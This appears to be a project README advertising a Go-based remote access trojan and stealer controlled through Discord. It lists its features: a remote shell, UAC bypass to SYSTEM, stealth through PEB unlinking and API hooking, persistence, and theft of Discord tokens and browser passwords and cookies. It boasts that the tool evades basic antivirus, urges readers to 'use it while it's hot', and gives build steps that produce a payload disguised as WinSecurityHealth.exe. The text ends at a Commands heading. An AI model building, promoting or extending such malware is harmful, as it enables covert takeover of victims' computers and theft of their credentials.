A lightweight RAT and stealer, cooked up in Go. It uses Discord for C2, keeping things fast and low-profile.

**Current Status: BETA.** The tool works, but expect more features down the line.

## 🔥 Features
- **Remote Shell:** Full `cmd` and `powershell` access.
- **Privilege Escalation:** Methods to bypass UAC and go for god mode (`NT AUTHORITY\SYSTEM`).
- **Stealth Module**: PEB unlinking, API hooking, and process name spoofing to stay off the radar.
- **Discord C2:** Manage clients from a Discord server. Simple and effective.
- **Persistence:** Tries to stick around after a reboot.
- **Data Exfiltration:** Grabs Discord tokens and browser data (passwords, cookies, etc.).
- **Live Surveillance:** `!screen` command for a live look at the desktop.
- **Self-Destruct:** `!exit` command nukes the agent from the system.
- **Tiny Payload:** The final `.exe` is **under 3MB**.

📜 **Changelog:** [See latest updates](./CHANGELOG.md)

## Is It UD?
Let's be real. This is a POC, not a state-sponsored weapon. It's built without any serious obfuscation. Any decent analyst can tear it apart in IDA.

*   **Right now? It's SEMI-UD.** It'll slip past a lot of basic AVs.

So yeah, **use it while it's hot.**

##  How to Build
I made this dead simple.

1.  **Install Go.** If you don't have it, figure it out.
2.  **Run `build.bat`.** It will ask for your **Bot Token** and **Server ID**. Paste them in and hit Enter.
3.  **Done.** Look for `WinSecurityHealth.exe`. That's your payload.

##  Commands
Run these in the bot channel on Discord.
